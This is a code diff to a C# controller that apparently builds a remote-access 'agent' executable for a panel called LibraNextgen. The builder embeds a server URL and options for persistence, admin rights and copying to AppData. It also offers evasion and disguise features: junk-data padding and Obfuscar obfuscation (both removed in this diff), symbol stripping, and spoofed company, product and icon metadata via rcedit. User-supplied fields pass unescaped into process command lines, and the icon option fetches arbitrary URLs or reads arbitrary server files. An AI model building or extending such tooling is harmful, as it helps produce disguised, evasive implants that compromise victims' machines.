@@ -3,7 +3,6 @@ using System.Diagnostics;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.Json;
-using System.Text.Json.Serialization;
 using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Mvc;
 using LibraNextgen.Common.Models;
@@ -15,16 +14,8 @@ namespace LibraNextgen.Service.Controllers;
 [Authorize]
 public class BuilderController : ControllerBase
 {
-    private static readonly string AgentProjDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "agent"));
     private static readonly string OutputBase = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output"));
     private static readonly string HistoryFile = Path.Combine(OutputBase, "builds.json");
-
-    private static readonly Dictionary<string, string> PlatformRid = new()
-    {
-        ["x64"] = "win-x64",
-        ["x86"] = "win-x86",
-        ["arm"] = "linux-arm64",
-    };
 
     private static readonly string RustAgentDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "agent-rs"));
 
@@ -101,7 +92,7 @@ public class BuilderController : ControllerBase
     [HttpPost("build")]
     public IActionResult Build([FromBody] BuildConfigRequest req)
     {
-        if (!PlatformRid.TryGetValue(req.Platform, out var rid))
+        if (!RustTargetTriple.ContainsKey(req.Platform))
             return BadRequest(new { error = $"Unsupported platform: {req.Platform}" });
 
         var buildId = Guid.NewGuid().ToString("N")[..8];
@@ -123,8 +114,8 @@ public class BuilderController : ControllerBase
         var job = new BuildJob { Record = record };
         _activeJobs[buildId] = job;
 
-        // Run build in background
-        _ = Task.Run(() => RunBuildAsync(buildId, req, rid, job));
+        // Run Rust build in background
+        _ = Task.Run(() => RunBuildAsync(buildId, req, job));
 
         return Ok(new { buildId });
     }
@@ -261,237 +252,7 @@ public class BuilderController : ControllerBase
 
     // ── Build engine ───────────────────────────────────────────────────
 
-    private async Task RunBuildAsync(string buildId, BuildConfigRequest req, string rid, BuildJob job)
-    {
-        var tempDir = Path.Combine(OutputBase, buildId);
-        var agentSourceDir = Path.Combine(tempDir, "agent");
-        var commonSourceDir = Path.Combine(tempDir, "common");
-
-        try
-        {
-            if (req.Language == "rust")
-            {
-                await RunRustBuildAsync(buildId, req, rid, job);
-                return;
-            }
-
-            lock (_buildLock)
-            {
-                if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true);
-                Directory.CreateDirectory(tempDir);
-            }
-
-            job.Log("Preparing source...");
-
-            CopyDir(AgentProjDir, agentSourceDir);
-            var commonProjDir = Path.GetFullPath(Path.Combine(AgentProjDir, "..", "LibraNextgen.Common"));
-            CopyDir(commonProjDir, commonSourceDir);
-
-            // Fix project reference
-            var csprojPath = Path.Combine(agentSourceDir, "agent.csproj");
-            var csproj = await System.IO.File.ReadAllTextAsync(csprojPath);
-            csproj = csproj.Replace(
-                @"Include=""..\LibraNextgen.Common\LibraNextgen.Common.csproj""",
-                @"Include=""..\common\LibraNextgen.Common.csproj""");
-
-            // Write BuildDefaults.cs
-            var serverUrl = $"http://{req.ServerHost}:{req.ServerPort}";
-            var buildDefaults = new StringBuilder();
-            buildDefaults.AppendLine("namespace LibraNextgen.Agent.Core;");
-            buildDefaults.AppendLine("public static class BuildDefaults");
-            buildDefaults.AppendLine("{");
-            buildDefaults.AppendLine($"    public static string? ServerUrl = \"{serverUrl}\";");
-            buildDefaults.AppendLine($"    public static bool RequireAdmin = {req.RequireAdmin.ToString().ToLower()};");
-            buildDefaults.AppendLine($"    public static string? CopyToPath = {(req.CopyToAppData ? "\"LibraNextgen\"" : "null")};");
-            buildDefaults.AppendLine($"    public static bool EnablePersistence = {req.EnablePersistence.ToString().ToLower()};");
-            buildDefaults.AppendLine("}");
-            var coreDir = Path.Combine(agentSourceDir, "Core");
-            await System.IO.File.WriteAllTextAsync(Path.Combine(coreDir, "BuildDefaults.cs"), buildDefaults.ToString());
-
-            // Patch csproj for OutputType
-            var outputType = req.ApplicationType == "Desktop" ? "WinExe" : "Exe";
-            csproj = csproj.Replace("  </PropertyGroup>",
-                $"    <OutputType>{outputType}</OutputType>\n  </PropertyGroup>");
-
-            // Patch csproj for metadata / icon
-            if (!string.IsNullOrEmpty(req.CompanyName) || !string.IsNullOrEmpty(req.FileDescription) ||
-                !string.IsNullOrEmpty(req.ProductName) || !string.IsNullOrEmpty(req.Copyright) ||
-                !string.IsNullOrEmpty(req.FileVersion) || !string.IsNullOrEmpty(req.IconUrl))
-            {
-                var props = new List<string>();
-                if (!string.IsNullOrEmpty(req.CompanyName)) props.Add($"    <Company>{EscapeXml(req.CompanyName)}</Company>");
-                if (!string.IsNullOrEmpty(req.FileDescription)) props.Add($"    <Description>{EscapeXml(req.FileDescription)}</Description>");
-                if (!string.IsNullOrEmpty(req.ProductName)) props.Add($"    <Product>{EscapeXml(req.ProductName)}</Product>");
-                if (!string.IsNullOrEmpty(req.Copyright)) props.Add($"    <Copyright>{EscapeXml(req.Copyright)}</Copyright>");
-                if (!string.IsNullOrEmpty(req.FileVersion)) props.Add($"    <FileVersion>{EscapeXml(req.FileVersion)}</FileVersion>");
-                if (!string.IsNullOrEmpty(req.IconUrl)) props.Add($"    <ApplicationIcon>{EscapeXml(req.IconUrl)}</ApplicationIcon>");
-
-                var insert = string.Join("\n", props);
-                csproj = csproj.Replace("  </PropertyGroup>", $"{insert}\n  </PropertyGroup>");
-            }
-
-            // Handle icon
-            if (!string.IsNullOrEmpty(req.IconUrl))
-            {
-                try
-                {
-                    byte[]? iconBytes = null;
-                    if (System.IO.File.Exists(req.IconUrl))
-                        iconBytes = await System.IO.File.ReadAllBytesAsync(req.IconUrl);
-                    else if (req.IconUrl.StartsWith("http"))
-                    {
-                        using var http = new HttpClient();
-                        iconBytes = await http.GetByteArrayAsync(req.IconUrl);
-                    }
-
-                    if (iconBytes != null && iconBytes.Length > 0)
-                    {
-                        await System.IO.File.WriteAllBytesAsync(Path.Combine(agentSourceDir, "custom.ico"), iconBytes);
-                        csproj = csproj.Replace($"<ApplicationIcon>{EscapeXml(req.IconUrl)}</ApplicationIcon>",
-                            "<ApplicationIcon>custom.ico</ApplicationIcon>");
-                    }
-                }
-                catch { job.Log("[WARN] Icon handling failed, continuing without icon."); }
-            }
-
-            await System.IO.File.WriteAllTextAsync(csprojPath, csproj);
-
-            // Build
-            var outDir = Path.Combine(tempDir, "out");
-            var trimFlag = req.TrimUnused ? "-p:PublishTrimmed=true" : "";
-            var buildArgs = $"publish \"{agentSourceDir}/agent.csproj\" -c Release -r {rid} --self-contained true {trimFlag} -p:DebugType=none -p:DebugSymbols=false -o \"{outDir}\"";
-
-            job.Log($"dotnet {buildArgs}");
-
-            var psi = new ProcessStartInfo("dotnet", buildArgs)
-            {
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                UseShellExecute = false,
-                CreateNoWindow = true,
-            };
-
-            using var proc = new Process { StartInfo = psi };
-
-            var outputTcs = new TaskCompletionSource();
-            var errorTcs = new TaskCompletionSource();
-
-            proc.OutputDataReceived += (_, e) =>
-            {
-                if (e.Data != null) job.Log(e.Data);
-                else outputTcs.TrySetResult();
-            };
-            proc.ErrorDataReceived += (_, e) =>
-            {
-                if (e.Data != null) job.Log($"[stderr] {e.Data}");
-                else errorTcs.TrySetResult();
-            };
-
-            proc.Start();
-            proc.BeginOutputReadLine();
-            proc.BeginErrorReadLine();
-            await proc.WaitForExitAsync();
-            await Task.WhenAll(outputTcs.Task, errorTcs.Task);
-
-            if (proc.ExitCode != 0)
-            {
-                job.Fail($"dotnet publish exited with code {proc.ExitCode}");
-                UpdateHistory(job);
-                return;
-            }
-
-            // Find output exe
-            var exeName = rid.StartsWith("win") ? "agent.exe" : "agent";
-            var exePath = Path.Combine(outDir, exeName);
-            if (!System.IO.File.Exists(exePath))
-                exePath = Directory.GetFiles(outDir, rid.StartsWith("win") ? "*.exe" : "*")
-                    .FirstOrDefault(f => !f.EndsWith(".pdb") && !f.EndsWith(".dll")) ?? exePath;
-
-            if (!System.IO.File.Exists(exePath))
-            {
-                job.Fail("Build succeeded but output executable not found.");
-                UpdateHistory(job);
-                return;
-            }
-
-            // Post-process: inject junk data
-            if (req.InjectJunkData && req.JunkDataMb > 0)
-            {
-                job.Log($"Injecting {req.JunkDataMb} MB junk data...");
-                var junk = RandomNumberGenerator.GetBytes(req.JunkDataMb * 1024 * 1024);
-                await using var fs = System.IO.File.Open(exePath, FileMode.Append);
-                await fs.WriteAsync(junk);
-            }
-
-            // Obfuscation
-            if (req.EnableObfuscation)
-            {
-                job.Log("Running Obfuscar...");
-                var obfuscarConfig = GenerateObfuscarConfig(outDir);
-                var obfuscConfigPath = Path.Combine(tempDir, "obfuscar.xml");
-                await System.IO.File.WriteAllTextAsync(obfuscConfigPath, obfuscarConfig);
-
-                var obfPsi = new ProcessStartInfo("obfuscar.console", obfuscConfigPath)
-                {
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                };
-                try
-                {
-                    using var obfProc = Process.Start(obfPsi);
-                    if (obfProc != null)
-                    {
-                        var obfOut = await obfProc.StandardOutput.ReadToEndAsync();
-                        var obfErr = await obfProc.StandardError.ReadToEndAsync();
-                        await obfProc.WaitForExitAsync();
-                        if (!string.IsNullOrWhiteSpace(obfOut)) job.Log(obfOut);
-                        if (!string.IsNullOrWhiteSpace(obfErr)) job.Log($"[obfuscar] {obfErr}");
-                    }
-                }
-                catch (Exception ex) { job.Log($"[WARN] Obfuscar failed: {ex.Message}"); }
-            }
-
-            // Move binary to build output root
-            var finalDir = Path.Combine(OutputBase, buildId);
-            var finalPath = Path.Combine(finalDir, job.Record.FileName);
-            Directory.CreateDirectory(finalDir);
-            System.IO.File.Copy(exePath, finalPath, true);
-
-            var fileInfo = new FileInfo(finalPath);
-            job.Complete(fileInfo.Length);
-
-            job.Log($"Build complete: {finalPath} ({fileInfo.Length} bytes)");
-
-            // Cleanup temp source
-            lock (_buildLock)
-            {
-                try { if (Directory.Exists(tempDir + "_src")) Directory.Delete(tempDir + "_src", true); }
-                catch { }
-            }
-
-            UpdateHistory(job);
-        }
-        catch (Exception ex)
-        {
-            job.Fail(ex.Message);
-            UpdateHistory(job);
-        }
-        finally
-        {
-            // Keep the job in dictionary for a bit so SSE clients can drain
-            _ = Task.Run(async () =>
-            {
-                await Task.Delay(30_000);
-                _activeJobs.TryRemove(buildId, out _);
-            });
-        }
-    }
-
-    // ── Rust build ──────────────────────────────────────────────────────
-
-    private async Task RunRustBuildAsync(string buildId, BuildConfigRequest req, string rid, BuildJob job)
+    private async Task RunBuildAsync(string buildId, BuildConfigRequest req, BuildJob job)
     {
         var tempDir = Path.Combine(OutputBase, buildId);
         var targetDir = Path.Combine(tempDir, "target");
@@ -518,20 +279,27 @@ public class BuilderController : ControllerBase
             // Determine target triple
             string? targetTriple = null;
             if (RustTargetTriple.TryGetValue(req.Platform, out var triple))
-            {
                 targetTriple = triple;
-            }
 
-            // Build target arg
             var targetArg = targetTriple != null ? $"--target {targetTriple}" : "";
 
-            // Run cargo build
-            job.Log($"Building Rust agent (platform: {req.Platform}{(targetTriple != null ? ", target: " + targetTriple : "")})...");
-            job.Log($"cargo build --release {targetArg} --target-dir \"{targetDir}\"");
+            // Desktop mode: add --features desktop
+            var featuresArg = req.ApplicationType == "Desktop" ? "--features desktop" : "";
 
-            var buildArgs = $"build --release {targetArg} --target-dir \"{targetDir}\"";
-            // Run cargo from the agent-rs workspace root
-            var buildResult = await RunProcessAsync("cargo", buildArgs, job, RustAgentDir);
+            // Build command
+            job.Log($"Building Rust agent (platform: {req.Platform}{(targetTriple != null ? ", target: " + targetTriple : "")}, mode: {req.ApplicationType})...");
+            var buildArgs = $"build --release {targetArg} {featuresArg} --target-dir \"{targetDir}\"";
+            job.Log($"cargo {buildArgs}");
+
+            // Set RUSTFLAGS for strip if requested
+            var envVars = new Dictionary<string, string>();
+            if (req.StripSymbols)
+            {
+                envVars["RUSTFLAGS"] = "-C strip=symbols";
+                job.Log("Strip symbols enabled (RUSTFLAGS=-C strip=symbols)");
+            }
+
+            var buildResult = await RunProcessAsync("cargo", buildArgs, job, RustAgentDir, envVars);
 
             if (buildResult.ExitCode != 0)
             {
@@ -545,14 +313,12 @@ public class BuilderController : ControllerBase
                 ? Path.Combine(targetDir, targetTriple, "release")
                 : Path.Combine(targetDir, "release");
 
-            var exeName = (targetTriple != null && targetTriple.Contains("windows")) || targetTriple == null
-                ? "agent.exe"
-                : "agent";
+            var isWindows = (targetTriple != null && targetTriple.Contains("windows")) || targetTriple == null;
+            var exeName = isWindows ? "agent.exe" : "agent";
 
             var exePath = Path.Combine(releaseDir, exeName);
             if (!System.IO.File.Exists(exePath))
             {
-                // Try searching
                 var found = Directory.GetFiles(releaseDir, "*")
                     .FirstOrDefault(f => Path.GetFileName(f) == "agent" || Path.GetFileName(f) == "agent.exe");
                 if (found != null)
@@ -566,7 +332,13 @@ public class BuilderController : ControllerBase
                 return;
             }
 
-            job.Log($"Binary found: {exePath}");
+            job.Log($"Binary found: {exePath} ({new FileInfo(exePath).Length / 1024} KB)");
+
+            // ── Icon & metadata embedding via rcedit (Windows PE only) ──
+            if (isWindows && HasIconOrMetadata(req))
+            {
+                await EmbedIconAndMetadata(req, exePath, job);
+            }
 
             // ── Config injection: append CONFIG_MAGIC + length + JSON ──
             job.Log("Injecting build config...");
@@ -591,12 +363,9 @@ public class BuilderController : ControllerBase
 
             await using (var fs = System.IO.File.Open(exePath, FileMode.Append))
             {
-                // Magic
                 await fs.WriteAsync(magicBytes);
-                // Length (4 bytes, little-endian)
                 var lenBytes = BitConverter.GetBytes((uint)configBytes.Length);
                 await fs.WriteAsync(lenBytes);
-                // JSON payload
                 await fs.WriteAsync(configBytes);
             }
 
@@ -637,13 +406,13 @@ public class BuilderController : ControllerBase
 
             var fileInfo = new FileInfo(finalPath);
             job.Complete(fileInfo.Length);
-            job.Log($"Build complete: {finalPath} ({fileInfo.Length} bytes)");
+            job.Log($"Build complete: {finalPath} ({fileInfo.Length / 1024} KB)");
 
             UpdateHistory(job);
         }
         catch (Exception ex)
         {
-            job.Fail($"Rust build failed: {ex.Message}");
+            job.Fail($"Build failed: {ex.Message}");
             UpdateHistory(job);
         }
         finally
@@ -656,7 +425,7 @@ public class BuilderController : ControllerBase
         }
     }
 
-    private static async Task<ProcessResult> RunProcessAsync(string fileName, string arguments, BuildJob job, string? workingDir = null)
+    private static async Task<ProcessResult> RunProcessAsync(string fileName, string arguments, BuildJob job, string? workingDir = null, Dictionary<string, string>? envVars = null)
     {
         var psi = new ProcessStartInfo(fileName, arguments)
         {
@@ -666,6 +435,11 @@ public class BuilderController : ControllerBase
             CreateNoWindow = true,
         };
         if (workingDir != null) psi.WorkingDirectory = workingDir;
+        if (envVars != null)
+        {
+            foreach (var (key, value) in envVars)
+                psi.Environment[key] = value;
+        }
 
         using var proc = new Process { StartInfo = psi };
         var stdoutTcs = new TaskCompletionSource<string>();
@@ -707,33 +481,73 @@ public class BuilderController : ControllerBase
 
     // ── Helpers ────────────────────────────────────────────────────────
 
-    private static void CopyDir(string src, string dst)
+    private static bool HasIconOrMetadata(BuildConfigRequest req)
     {
-        foreach (var dir in Directory.GetDirectories(src, "*", SearchOption.AllDirectories))
-        {
-            var target = Path.Combine(dst, Path.GetRelativePath(src, dir));
-            Directory.CreateDirectory(target);
-        }
-        foreach (var file in Directory.GetFiles(src, "*", SearchOption.AllDirectories))
-        {
-            var target = Path.Combine(dst, Path.GetRelativePath(src, file));
-            System.IO.File.Copy(file, target, true);
-        }
+        return !string.IsNullOrEmpty(req.IconUrl) ||
+               !string.IsNullOrEmpty(req.CompanyName) ||
+               !string.IsNullOrEmpty(req.FileDescription) ||
+               !string.IsNullOrEmpty(req.ProductName) ||
+               !string.IsNullOrEmpty(req.Copyright) ||
+               !string.IsNullOrEmpty(req.FileVersion);
     }
 
-    private static string GenerateObfuscarConfig(string outDir)
+    private async Task EmbedIconAndMetadata(BuildConfigRequest req, string exePath, BuildJob job)
     {
-        return $@"<?xml version='1.0'?>
-<Obfuscator>
-  <Var name='InPath' value='{outDir}' />
-  <Var name='OutPath' value='{outDir}_obfuscated' />
-  <Module file='$(InPath)/agent.dll'>
-    <SkipType name='LibraNextgen.Agent.Program' />
-  </Module>
-</Obfuscator>";
-    }
+        job.Log("Embedding icon/metadata via rcedit...");
 
-    private static string EscapeXml(string s) => s.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;");
+        // Resolve icon file
+        string? iconPath = null;
+        if (!string.IsNullOrEmpty(req.IconUrl))
+        {
+            try
+            {
+                if (System.IO.File.Exists(req.IconUrl))
+                {
+                    iconPath = req.IconUrl;
+                }
+                else if (req.IconUrl.StartsWith("http"))
+                {
+                    using var http = new HttpClient();
+                    var iconBytes = await http.GetByteArrayAsync(req.IconUrl);
+                    iconPath = Path.Combine(Path.GetTempPath(), $"libra-icon-{Guid.NewGuid():N}.ico");
+                    await System.IO.File.WriteAllBytesAsync(iconPath, iconBytes);
+                }
+            }
+            catch { job.Log("[WARN] Icon download failed, skipping icon."); }
+        }
+
+        var args = new List<string>();
+        if (iconPath != null) args.Add($"--set-icon \"{iconPath}\"");
+        if (!string.IsNullOrEmpty(req.FileVersion))
+        {
+            args.Add($"--set-file-version \"{req.FileVersion}\"");
+            args.Add($"--set-product-version \"{req.FileVersion}\"");
+        }
+        if (!string.IsNullOrEmpty(req.CompanyName))
+            args.Add($"--set-version-string CompanyName \"{req.CompanyName}\"");
+        if (!string.IsNullOrEmpty(req.FileDescription))
+            args.Add($"--set-version-string FileDescription \"{req.FileDescription}\"");
+        if (!string.IsNullOrEmpty(req.ProductName))
+            args.Add($"--set-version-string ProductName \"{req.ProductName}\"");
+        if (!string.IsNullOrEmpty(req.Copyright))
+            args.Add($"--set-version-string LegalCopyright \"{req.Copyright}\"");
+
+        if (args.Count == 0) return;
+
+        var rceditArgs = $"\"{exePath}\" {string.Join(" ", args)}";
+        try
+        {
+            var result = await RunProcessAsync("rcedit", rceditArgs, job);
+            if (result.ExitCode == 0)
+                job.Log("Icon/metadata embedded successfully.");
+            else
+                job.Log($"[WARN] rcedit failed (exit {result.ExitCode}), continuing without icon/metadata.");
+        }
+        catch (Exception ex)
+        {
+            job.Log($"[WARN] rcedit not available: {ex.Message}. Install rcedit to enable icon/metadata embedding.");
+        }
+    }
 }
 
 // ── Supporting types ──────────────────────────────────────────────────
